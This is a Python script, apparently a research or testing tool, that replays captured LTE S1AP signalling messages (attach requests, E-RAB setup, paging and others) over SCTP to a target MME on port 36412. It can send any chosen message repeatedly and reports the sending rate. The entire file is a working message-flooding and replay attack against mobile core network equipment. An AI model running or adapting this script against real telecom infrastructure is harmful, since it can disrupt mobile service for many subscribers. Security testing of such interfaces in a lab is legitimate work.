#!/usr/bin/env python

import sctp
import binascii
import sys, socket
import time
from itertools import repeat
#per provare in locale: sudo ncat --sctp -l -p 36412

#interface 3GPP S1-MME

#verifcare se i seguenti moduli sono caricati
#sudo insmod /lib/modules/3.6.11-4.fc16.i686/kernel/lib/libcrc32c.ko
#sudo insmod /lib/modules/3.6.11-4.fc16.i686/kernel/net/sctp/sctp.ko

#echo 1 > /proc/sys/net/sctp/max_init_retransmits

def usage():
    print "usage : python s1attacks.py <dst ip > <test_case [0-7]> <num_msg> "
    exit(0)

if len(sys.argv) < 4 :
    usage()

dest_ip = sys.argv[1]

test_case = int(sys.argv[2])


num_msg = int(sys.argv[3])
if num_msg == 0:
    num_msg = 1


payloads = [['Initial Attach Request (eNB2MME)','000c405200000500080004800e7bd2001a00282707417208292210173006481004e0e0c0400005025ed011d15c0a003103e5c0349011035758a6f1004300060022f210000b006440080022f2100a619a1000864001300000'],
            ['E-RabSetup Request (MME2eNB)','000500808800000300000005c00ab055a70008000340d54000100071000011006c0c0006090f800a076011342877305d27b5e8ef07036202c101061f0469626f780374696d026974066d6e63303031066d6363323232046770727305010ab563595e06fefe926c02002722808021100300001081060ace388483060acf2b2e000d040ace3884000d040acf2b2e000000'],
            ['E-RabSetup Response (eNB2MME)','0006f6881a80fa163e87019281004f400800454a005c000040004084522f0a0a738c0a0a60058e3c8e3c0a6453e97efb05740003003a1f91b4f70001053d000000122005002600000300004005c00ab055a70008400340d540001c400f000027400a0c1f0a0a738c00007b210000'],
            ['Paging(MME2eNB)','000a4027000004005040023180002b40060e10f810a74c006d400180002e400b00002f40060022f210592600'],
            ['UECapabilityIndication (eNB2ME)','0016402b00000300000005c00ab055a70008000340d540004a40141300880100e81200001083010381d7837620000000'],
            ['InitialContextRequest (eNB2ME)','2009002600000300004005c00ab055a70008400340d5400033400f000032400a0a1f0a0a738c00007b010000'],
            ['Uplink-NAS-Transport (eNB2ME)','000d403b00000500000005c00ab055a70008000340d540001a000e0d277d57e7ad01074300035200c2006440080022f210f4241010004340060022f210592600'],
            ]

num_tests = len(payloads) - 1

if test_case > num_tests:
    print ("Errore. inserire un test case id compreso "
            "tra 0 e %d"%(num_tests))
    exit(0)
    
s = sctp.sctpsocket_tcp(socket.AF_INET)
s.connect((str(dest_ip),36412))

print "Sending %d %s"%(num_msg, payloads[test_case][0])
payload = binascii.unhexlify(payloads[test_case][1])

start = time.time()
for _ in repeat(None, num_msg):
    s.send(payload)
end = time.time()
print "pps : %06.2f"%(num_msg/(end - start))
s.close()
